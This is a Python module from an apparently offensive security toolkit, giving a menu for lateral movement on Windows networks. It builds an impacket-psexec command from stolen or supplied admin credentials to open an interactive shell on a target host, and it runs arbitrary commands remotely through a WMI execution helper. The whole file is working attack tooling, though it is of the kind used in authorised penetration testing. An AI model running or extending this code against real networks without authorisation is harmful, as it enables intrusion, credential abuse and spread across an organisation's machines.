from modules import execution

def run():
    while True:
        print("\n--- Lateral Movement ---")
        print("1. PsExec Shell (impacket)")
        print("2. WMI Command Execution (impacket)")
        print("99. Return to Main Menu")

        choice = input("Enter your choice: ")

        if choice == '1':
            psexec_shell()
        elif choice == '2':
            # We already have a wmi_exec function, we can just call it from a menu
            wmi_command()
        elif choice == '99':
            print("Returning to main menu...")
            return
        else:
            print("Invalid choice. Please try again.")

def psexec_shell():
    print("\n[+] PsExec Interactive Shell")
    print("[!] This requires administrative rights on the target machine.")
    
    domain = input("Enter Target Domain: ")
    target_ip = input("Enter IP of the target host: ")
    username = input("Enter Username (with admin rights): ")
    password = input("Enter Password: ")
    
    # Using impacket-psexec
    # The format is: domain/username:password@target_ip
    credentials = f"'{domain}/{username}:{password}@{target_ip}'"
    command = f"impacket-psexec {credentials}"
    
    print("\n[*] CONSTRUCTED COMMAND [*]")
    print("-" * 50)
    print(command)
    print("-" * 50)
    print("\n[!] Copy the command above and run it in a NEW, SEPARATE terminal.")
    print("[!] This gives you a stable, interactive shell without complicating the toolkit.")
    input("\nPress Enter to continue...")

def wmi_command():
    print("\n[+] WMI Command Execution")
    print("[!] This requires administrative rights on the target machine.")
    
    domain = input("Enter Target Domain: ")
    target_ip = input("Enter IP of the target host: ")
    username = input("Enter Username (with admin rights): ")
    password = input("Enter Password: ")
    command_to_run = input("Enter the command to execute on the target: ")

    print(f"\n[*] Attempting to execute '{command_to_run}' on {target_ip} via WMI...")
    execution.wmi_exec(target_ip, domain, username, password, command_to_run)
    input("\nPress Enter to continue...")
